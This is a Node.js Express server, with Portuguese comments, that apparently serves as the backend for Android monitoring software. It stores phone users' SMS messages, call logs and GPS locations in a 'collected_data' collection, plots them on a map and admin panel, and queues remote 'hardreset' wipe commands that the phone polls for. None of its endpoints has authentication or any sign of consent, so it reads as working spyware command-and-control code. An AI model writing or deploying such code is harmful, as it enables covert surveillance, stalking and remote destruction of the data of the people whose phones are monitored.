require('dotenv').config();

const express  = require('express');
const mongoose = require('mongoose');
const cors     = require('cors');
const path     = require('path');

const app = express();

// Middlewares
app.use(cors());
app.use(express.json());
app.use('/public', express.static(path.join(__dirname, 'public')));

// Conexão com MongoDB Atlas
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log('MongoDB Atlas conectado'))
  .catch(err => {
    console.error('Erro ao conectar ao MongoDB Atlas:', err.message);
    process.exit(1);
  });

// Schemas e Models
const dataSchema = new mongoose.Schema({
  username:  String,
  timestamp: Date,
  location: {
    lat:  Number,
    lng:  Number,
    time: Date
  },
  sms:   Array,
  calls: Array
}, { collection: 'collected_data' });

const cmdSchema = new mongoose.Schema({
  username:  String,
  command:   String,
  issuedAt:  Date,
  executed:  { type: Boolean, default: false }
}, { collection: 'commands' });

const Data = mongoose.model('Data', dataSchema);
const Cmd  = mongoose.model('Cmd', cmdSchema);

// Rotas

// Recebe dados do app Android
app.post('/api/data', async (req, res) => {
  try {
    const doc = new Data(req.body);
    await doc.save();
    res.status(201).json({ status: 'ok' });
  } catch (e) {
    console.error('POST /api/data error:', e);
    res.status(500).json({ error: e.message });
  }
});

// Lista até 500 pontos para o mapa
app.get('/api/data', async (req, res) => {
  try {
    const all = await Data.find()
      .sort({ timestamp: -1 })
      .limit(500)
      .lean();
    res.json(all);
  } catch (e) {
    console.error('GET /api/data error:', e);
    res.status(500).json({ error: e.message });
  }
});

// Emite um comando (ex: hardreset) para um usuário
app.post('/api/command/:user', async (req, res) => {
  const user = req.params.user;
  try {
    const cmd = new Cmd({
      username: user,
      command:  'hardreset',
      issuedAt: new Date(),
      executed: false
    });
    await cmd.save();
    res.json({ status: 'command sent' });
  } catch (e) {
    console.error('POST /api/command/:user error:', e);
    res.status(500).json({ error: e.message });
  }
});

// App Android consulta comandos pendentes
app.get('/api/command/:user', async (req, res) => {
  const user = req.params.user;
  try {
    const cmd = await Cmd.findOne({ username: user, executed: false });
    if (!cmd) {
      return res.json({ command: null });
    }
    cmd.executed = true;
    await cmd.save();
    res.json({ command: cmd.command });
  } catch (e) {
    console.error('GET /api/command/:user error:', e);
    res.status(500).json({ error: e.message });
  }
});

// Servir o map view e o painel admin
app.get('/', (_, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});
app.get('/admin', (_, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Inicializa o servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});

